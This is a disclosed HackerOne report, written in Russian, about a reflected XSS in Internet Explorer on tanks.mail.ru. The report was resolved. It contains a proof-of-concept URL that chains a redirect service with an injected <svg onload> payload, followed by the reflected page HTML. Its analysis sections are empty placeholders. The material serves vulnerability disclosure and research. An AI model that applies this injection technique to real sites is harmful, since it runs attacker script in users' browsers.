---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '66423'
original_report_id: '66423'
title: '[tanks.mail.ru] Internet Explorer XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-06-07T16:28:13.928Z'
disclosed_at: '2016-10-06T12:22:36.960Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [tanks.mail.ru] Internet Explorer XSS via Request-URI

## Metadata

- HackerOne Report ID: 66423
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2016-10-06T12:22:36.960Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Открыть с помощью Internet Explorer 
(для формирования правильного запроса используется баг перенаправления, поэтому необходим сценарий "bf.am/x?r=")
```
http://bf.am/x?r=https://tanks.mail.ru/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
```
Результат:
```
<meta property="og:url" content="http://tanks.mail.ru/"><svg/onload=alert(document.domain)>/%2e%2e/%2e%2e/" />
...
<div id="shareToolbox" class="b-likes__inner" data-url="http://tanks.mail.ru/"><svg/onload=alert(document.domain)>/%2e%2e/%2e%2e/" data-title="Страница не найдена - Ошибка 404
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
